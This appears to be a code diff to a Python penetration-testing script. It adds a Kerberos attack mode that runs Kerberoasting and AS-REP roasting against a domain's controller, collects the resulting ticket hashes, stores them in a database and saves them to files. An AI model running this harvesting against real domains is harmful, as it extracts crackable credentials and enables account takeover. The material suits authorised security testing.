@@ -4,12 +4,12 @@ from utils import arguments
 from utils import dbmanager
 from utils import ewrapper
 from utils import getdc
+from utils import kerberosattacker  # Added for Kerberos attack functionality
 from utils import metasploiter
 from utils import masscanner
 from utils import mkdir
 from utils import nmapper
 # from utils import nullsession
-from utils import kerberosattacker
 from utils import richard as r
 from utils import sqlite as db
 from utils import xmlparser
@@ -34,6 +34,7 @@ TMP_DIR = os.path.join(MAIN_DIR, '.tmp')
 dc_dir = os.path.join(MAIN_DIR, 'dc')
 egress_dir = os.path.join(MAIN_DIR, 'egress')
 ew_dir = os.path.join(MAIN_DIR, 'eyewitness')
+kerberos_dir = os.path.join(MAIN_DIR, 'kerberos')  # Added for Kerberos attack results
 masscan_dir = os.path.join(MAIN_DIR, 'masscan')
 metasploit_dir = os.path.join(MAIN_DIR, 'metasploit')
 nmap_dir = os.path.join(MAIN_DIR, 'nmap')
@@ -46,7 +47,7 @@ ew_xml_filepath = os.path.join(scanman_dir, xml_dir, 'eyewitness.xml')
 targetfilepath = os.path.join(TMP_DIR, 'targets.txt')
 
 # Create output dirs.
-directories = [dc_dir, egress_dir, ew_dir, masscan_dir, metasploit_dir, nmap_dir, xml_dir]
+directories = [dc_dir, egress_dir, ew_dir, kerberos_dir, masscan_dir, metasploit_dir, nmap_dir, xml_dir]  # Added kerberos_dir
 dirs = [mkdir.mkdir(directory) for directory in directories]
 [logging.info(f'Created directory: {d}') for d in dirs if d is not None]
 
@@ -131,9 +132,9 @@ def remove_ansi(string):
 	return new_string
 
 
-def write_results(file_ext, , dictionary, dbquery):
+def write_results(file_ext, directory, dictionary, dbquery):
 	''' Write database results to a flatfile. 
-	arg(s)file_ext:str, dictionary:dict, :str, dbquery:funcobj '''
+	arg(s)file_ext:str, dictionary:dict, directory:str, dbquery:funcobj '''
 
 	for k, v in dictionary.items():
 		filepath = os.path.join(directory, f'{os.path.basename(k)}.{file_ext}')
@@ -274,6 +275,129 @@ def main():
 		write_results('ip', dc_dir, host_dct, db.get_ipaddress_by_domain)
 		write_results('fqdnip', dc_dir, host_dct, db.get_fqdn_and_ipaddress_by_domain)
 		write_results('zerologon', dc_dir, host_dct, db.get_hostname_and_ipaddress_by_domain)
+		print('\n')
+
+	# Kerberos attacks - optional mode
+	if args.domain and args.kerberos:
+		# Sqlite - database init for Kerberos results
+		db.create_table_kerberos()
+		
+		# Heading
+		print('\n')
+		r.console.print(f'Kerberos Attack Tools', style='appheading')
+		r.console.rule(style='rulecolor')
+		
+		# Get configuration
+		KERBEROS_CONFIG = {k: v for k, v in config['kerberos-attacks'].items()}
+		
+		# For each domain provided
+		for domain in args.domain:
+			try:
+				# Get domain controller IPs from database
+				dc_ips = db.get_ipaddress_by_domain(domain)
+				
+				if not dc_ips:
+					r.console.print(f'No domain controllers found for {domain}', style='notarget')
+					r.console.print(f'Skipped', style='skipcolor')
+					continue
+					
+				# Use first DC IP found
+				dc_ip = next(iter(dc_ips))
+				
+				# Prepare output files for this domain
+				kerberoast_output = os.path.join(kerberos_dir, f'{domain}_kerberoast.txt')
+				asreproast_output = os.path.join(kerberos_dir, f'{domain}_asreproast.txt')
+				
+				# Initialize Kerberos attacker
+				kerb = kerberosattacker.KerberosAttacker(
+					domain=domain,
+					domain_controller=dc_ip,
+					username=args.username,
+					password=args.password,
+					user_file=args.user_file,
+					hashes=args.hash
+				)
+				
+				# Kerberoasting attack
+				if KERBEROS_CONFIG.get('kerberoast', 'true').lower() == 'true':
+					r.console.print(f'[grey37]KERBEROASTING: {domain}')
+					
+					# Print command to be executed
+					kerb_cmd = kerb.get_kerberoast_command(kerberoast_output)
+					print(kerb_cmd)
+					
+					with r.console.status(spinner='bouncingBar', status=f'[status.text]KERBEROASTING {domain}') as status:
+						count = 0
+						results = kerb.kerberoast(kerberoast_output)
+						
+						if results and "No entries found" not in results:
+							# Process and display results
+							for line in results.splitlines():
+								if "$krb5tgs$" in line:  # This identifies ticket data
+									# Extract SPN from the result
+									spn_match = re.search(r'(\S+/\S+)', line)
+									if spn_match:
+										spn = spn_match.group(1)
+										# Insert into database
+										db.insert_kerberos(domain, dc_ip, 'kerberoast', spn, line)
+										# Print to console
+										r.console.print(f'[red]{spn}')
+										count += 1
+							
+							if count > 0:
+								r.console.print(f'Instances {count}', style='instances')
+								r.console.print(f'Hash tickets saved to: {kerberoast_output}', style='instances')
+							else:
+								r.console.print(f'No kerberoastable accounts found', style='notarget')
+						else:
+							r.console.print(f'No kerberoastable accounts found', style='notarget')
+					
+					print('\n')
+				
+				# AS-REP Roasting attack
+				if KERBEROS_CONFIG.get('asreproast', 'true').lower() == 'true':
+					r.console.print(f'[grey37]AS-REP ROASTING: {domain}')
+					
+					# Print command to be executed
+					asrep_cmd = kerb.get_asreproast_command(asreproast_output)
+					print(asrep_cmd)
+					
+					with r.console.status(spinner='bouncingBar', status=f'[status.text]AS-REP ROASTING {domain}') as status:
+						count = 0
+						results = kerb.asreproast(asreproast_output)
+						
+						if results and "No entries found" not in results:
+							# Process and display results
+							for line in results.splitlines():
+								if "$krb5asrep$" in line:  # This identifies AS-REP hash data
+									# Extract username from the result
+									user_match = re.search(r'(\S+)@', line)
+									if user_match:
+										username = user_match.group(1)
+										# Insert into database
+										db.insert_kerberos(domain, dc_ip, 'asreproast', username, line)
+										# Print to console
+										r.console.print(f'[red]{username}')
+										count += 1
+							
+							if count > 0:
+								r.console.print(f'Instances {count}', style='instances')
+								r.console.print(f'Hash tickets saved to: {asreproast_output}', style='instances')
+							else:
+								r.console.print(f'No users without pre-authentication found', style='notarget')
+						else:
+							r.console.print(f'No users without pre-authentication found', style='notarget')
+					
+					print('\n')
+					
+			except KeyboardInterrupt:
+				keyboard_interrupt()
+		
+		# Print successful scan completion
+		r.console.print('All Kerberos attacks have completed!', style='scanresult')
+		
+		# Write results to files
+		write_results('txt', kerberos_dir, {domain: domain for domain in args.domain}, db.get_kerberos_results_by_domain)
 		print('\n')
 
 	# Masscan - main mode.
@@ -582,6 +706,11 @@ def main():
 	# Sort data alphabetically from files in the 'dc' dir.
 	for file in os.listdir(dc_dir):
 		sort_alphabetical(os.path.join(dc_dir, file))
+	# Sort data in the 'kerberos' dir.
+	for file in os.listdir(kerberos_dir):
+		if file.endswith('.txt'):
+			# No sorting needed for hash files
+			pass
 
 
 if __name__ == '__main__':
